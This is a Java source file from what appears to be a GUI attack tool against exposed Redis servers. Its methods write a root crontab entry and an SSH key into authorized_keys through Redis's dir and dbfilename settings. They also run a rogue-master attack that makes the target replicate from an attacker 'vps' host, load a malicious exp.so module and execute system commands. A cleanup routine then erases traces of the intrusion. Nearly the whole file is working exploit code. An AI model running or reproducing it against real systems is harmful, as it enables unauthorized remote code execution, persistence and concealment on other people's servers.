package Dao;

import Controller.RedisController;
import Entity.ControllersFactory;
import Util.MessageUtil;
import Util.Utils;
import javafx.application.Platform;
import redis.clients.jedis.Jedis;
import org.apache.commons.lang.StringUtils;
import redis.clients.jedis.commands.ProtocolCommand;
import redis.clients.jedis.util.SafeEncoder;

import java.sql.SQLException;
import java.util.Arrays;
import java.util.List;

public class RedisDao {
    /**
     * 用此方法获取 RedisController 的日志框
     */
    private RedisController redisController = (RedisController) ControllersFactory.controllers.get(RedisController.class.getSimpleName());

    public static Jedis CONN;
    public static List<String> dir;
    public static String slaveReadOnlyFlag;

    private String ip;
    private int port;
    private String password;
    private int timeout;

    public RedisDao(String ip, String port, String password, String timeout) {
        this.ip = ip;
        this.port = Integer.parseInt(port);
        this.password = password;
        // 毫秒单位
        this.timeout = Integer.parseInt(timeout) * 1000;
    }

    /**
     * 测试是否成功连接上数据库，不需要持久化连接
     *
     * @return
     * @throws SQLException
     */
    public void testConnection() {
        CONN = new Jedis(ip, port, timeout);
        if (password.length() != 0) {
            CONN.auth(password);
        }
        if (CONN != null) {
            CONN.close();
        }
    }

    public void getConnection() throws Exception{
        CONN = new Jedis(ip, port, timeout);
        if (password.length() != 0) {
            CONN.auth(password);
        }



    }

    public void closeConnection() throws Exception {
        if (CONN != null) {
            CONN.close();
        }
    }

    public void getInfo() throws Exception{
        String info = CONN.info();
        dir = CONN.configGet("dir");

        List<String> dbfilename = CONN.configGet("dbfilename");
        String orginDir = StringUtils.join(dir, ": ");
        String orginDbfilename = StringUtils.join(dbfilename, ": ");
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log(orginDir));
            redisController.redisLogTextFArea.appendText(Utils.log(orginDbfilename));
            redisController.redisLogTextFArea.appendText(Utils.log("4.x,5.x 可使用主从备份请注意查看版本信息"));
            redisController.redisOutputTextFArea.setText(info);
        });
    }

    public void redisavedb(String dir, String dbfilename) {
        CONN.configSet("dir", dir);
        CONN.configSet("dbfilename", dbfilename);
        CONN.save();
    }


    public void redisslave(String vpsIp, String vpsPort) {
        try {
            Platform.runLater(() -> {
                redisController.redisLogTextFArea.appendText(Utils.log("Setting master: " + vpsIp + ":" + vpsPort));
            });
            // 开启主从
            CONN.slaveof(vpsIp, Integer.parseInt(vpsPort));

        } catch (Exception e) {
            Platform.runLater(() -> {
                redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
            });
        }
    }


    public void crontab(String cronText) {
        List<String> crondirs = Arrays.asList("/var/spool/cron/", "/var/spool/cron/crontab/", "/var/spool/cron/crontabs/");
        for (String dir : crondirs) {
            try {
                CONN.set("xxcron", "\n\n" + cronText + "\n\n");
                CONN.configSet("dir", dir);
                CONN.configSet("dbfilename", "root");
                CONN.save();
                Platform.runLater(() -> {
                    redisController.redisLogTextFArea.appendText(Utils.log(cronText + "\n" + "write cron success: " + dir + "root"));
                });
            } catch (Exception e) {
                Platform.runLater(() -> {
                    redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
                });
            }
        }
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("crontab unknown error"));
        });

    }

    public void sshkey(String sshRsa) {
        try {
            CONN.set("xxssh", "\n\n" + sshRsa + "\n\n");
            CONN.configSet("dir", "/root/.ssh/");
            CONN.configSet("dbfilename", "authorized_keys");
            CONN.save();
        } catch (Exception e) {
            Platform.runLater(() -> {
                redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
            });
        }
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("write ssh rsa success: " + sshRsa));
        });
    }

    public void rogue(String vpsip, String vpsport, int timeout) throws InterruptedException {
        redisslave(vpsip, vpsport);

        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("Setting dbfilename..."));
        });
        List<String> slaveReadOnlyList = CONN.configGet("slave-read-only");
        slaveReadOnlyFlag = slaveReadOnlyList.get(1);

        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("slave-read-only -> no ..."));
        });
        CONN.configSet("slave-read-only", "no");

        // 配置so文件
        CONN.configSet("dbfilename", "exp.so");

        List<String> dir = CONN.configGet("dir");
        String evalpath = dir.get(1) + "/exp.so";

        // 加载恶意so
        Thread.sleep(timeout);
        CONN.moduleLoad(evalpath);
        Thread.sleep(timeout);

        //关闭主从
        CONN.slaveofNoOne();
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("success write exp.so ..."));
        });

    }

    public enum SysCommand implements ProtocolCommand {
        EVAL("system.exec");

        private final byte[] raw;

        SysCommand(String alt) {
            raw = SafeEncoder.encode(alt);
        }

        @Override
        public byte[] getRaw() {
            return raw;
        }
    }

    public String eval(String command, String code) {
        String result = "";
        try {
            byte[] bytes = (byte[]) CONN.sendCommand(SysCommand.EVAL, command);
            result = (new String(bytes, code));
        } catch (Exception e) {
            Platform.runLater(() -> {
                MessageUtil.showExceptionMessage(e, e.getMessage());
            });
        }
        return result;
    }

    /**
     * 1. 清理目录和本地文件持久化位置修改
     * 2. 关闭主从
     * 3. 卸载导入so函数
     */
    public void clean() {
        CONN.configSet("dir", dir.get(1));
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("reset dir success"));
        });

        CONN.configSet("slave-read-only", slaveReadOnlyFlag);
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("reset slave-read-only success"));
        });
        CONN.configSet("dbfilename", "dump.rdb");
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("reset dbfilename success"));
        });
        CONN.slaveofNoOne();
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("reset slaveof success"));
        });
        eval("rm -f " + dir.get(1) + "/exp.so", "UTF-8");
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("remove exp file success"));
        });
        CONN.moduleUnload("system");
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("unload system.exec success"));
        });
        CONN.del("xxssh");
        CONN.del("xxcron");
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("delete exp key success"));
        });
    }

}
